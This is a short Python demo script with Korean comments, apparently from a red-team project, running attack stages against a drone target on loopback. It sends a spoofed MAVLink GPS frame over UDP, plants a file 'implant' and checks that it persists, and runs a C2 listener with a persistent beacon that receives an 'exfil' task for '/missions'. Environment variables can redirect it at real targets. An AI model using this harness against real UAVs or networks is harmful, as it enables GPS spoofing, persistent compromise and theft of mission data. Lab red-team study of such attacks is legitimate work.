#!/usr/bin/env python3
"""실인프라 3·5·6단계 데모 — 고도화 §K/§L (본선 보강).

    python benchmarks/infra_eval.py

전달(UDP 프레임)·설치지속(파일 발판 재부팅 생존)·C2(TCP 비콘) 실 전송을
loopback 으로 실증. 실 표적은 env 로 연결(uav-sim-env).
"""
from __future__ import annotations

import socket
import sys
import tempfile
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from redteam_core.persistence import FileImplant                        # noqa: E402
from redteam_core.transport import (                                    # noqa: E402
    C2Listener, PersistentBeacon, Tasking,
    build_mavlink_gps_frame, build_mavlink_param_set_frame, udp_deliver,
)


def main() -> None:
    print("=== fried-pollack-ai · 실인프라 3·5·6단계 — §K/§L (loopback 실증) ===\n")

    # 3단계 전달 — UDP 로 실제 프레임 송신
    rx = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    rx.bind(("127.0.0.1", 0)); rx.settimeout(2.0)
    host, port = rx.getsockname()
    n = udp_deliver(host, port, build_mavlink_gps_frame())
    data, _ = rx.recvfrom(65535); rx.close()
    print(f"[3 전달] GPS 스푸핑 프레임 {n}B UDP 송신 → 수신 {len(data)}B ✅")

    # 5단계 설치/지속 — 파일 발판 설치 후 '재부팅' 생존
    with tempfile.TemporaryDirectory() as d:
        imp = FileImplant(f"{d}/.implant")
        imp.install(b"rogue-foothold")
        survived = FileImplant(imp.path).is_persistent(expect=b"rogue-foothold")
        print(f"[5 설치/지속] 발판 설치 → 재부팅 모사 후 잔존={survived} ✅")

    # 6단계 C2 — TCP 지속 비콘 교신
    listener = C2Listener(tasking=Tasking("exfil", {"path": "/missions"}))
    listener.serve_once()
    t = PersistentBeacon(listener.host, listener.port, "beacon-A").beacon(timeout=2.0)
    listener.close()
    print(f"[6 C2] 지속 비콘 교신 → 태스킹 수신='{t.command}' ✅")

    print("\n모두 실제 소켓/FS 전송(loopback 검증). 실 표적은 env(MAVLINK_ENDPOINT/C2_HOST)로 연결.")


if __name__ == "__main__":
    main()
